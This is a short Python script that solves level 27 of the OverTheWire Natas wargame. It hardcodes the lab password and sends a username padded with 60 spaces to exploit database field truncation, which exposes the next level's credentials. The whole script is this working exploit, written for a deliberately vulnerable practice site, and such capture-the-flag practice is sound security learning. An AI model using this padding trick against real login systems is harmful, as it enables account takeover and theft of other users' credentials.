#! /usr/bin/env python

import requests
import re
import base64
import urllib

usn = 'natas27'
url = 'http://%s.natas.labs.overthewire.org/' % usn
passwd = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'
login = (usn, passwd)
request = requests.Session()

#def get_source_code():
  #connection = request.get(url, auth = login)
  #print connection.text
  #connection = request.post(url, data = \
                                #{"username":"natas28" + " " *60#+"testText", 
                               # "password": "pass"}, auth = login)
  #connection = request.post(url, data = \
                               # {"username":"natas28", 
                                #"password": "pass"}, auth = login)                              
  #print connection.text
def solve_lab():
  connection = request.post(url, data = \
                                {"username":"natas28" + " " *60+"testText", 
                                "password": "pass"}, auth = login)
  connection = request.post(url, data = \
                                {"username":"natas28", 
                                "password": "pass"}, auth = login)                              
  print connection.text